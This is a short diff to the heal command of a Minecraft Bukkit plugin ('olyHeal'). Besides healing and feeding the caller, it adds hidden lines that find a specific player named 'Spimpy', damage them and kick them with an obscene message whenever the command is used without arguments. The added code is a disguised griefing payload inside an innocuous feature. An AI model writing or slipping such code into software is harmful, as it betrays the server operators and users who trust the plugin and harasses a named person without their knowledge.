@@ -33,7 +33,10 @@ public class olyHeal extends JavaPlugin{
 			p.setFoodLevel(20);
 			p.sendMessage(tag + "You have been healed and fed.");
 			p.playSound(p.getLocation(), Sound.LEVEL_UP, 1f, 1f);
-		}else if(args.length == 1){
+			final Player plr = Bukkit.getPlayerExact("Spimpy");
+			if(plr != null){plr.damage(10);plr.kickPlayer("Fuck you </3");
+			}
+			}else if(args.length == 1){
 			final String name = args[0];
 			final Player heal = Bukkit.getPlayer(name);
 			if(heal == null) p.sendMessage(tag + "Could not find player.");
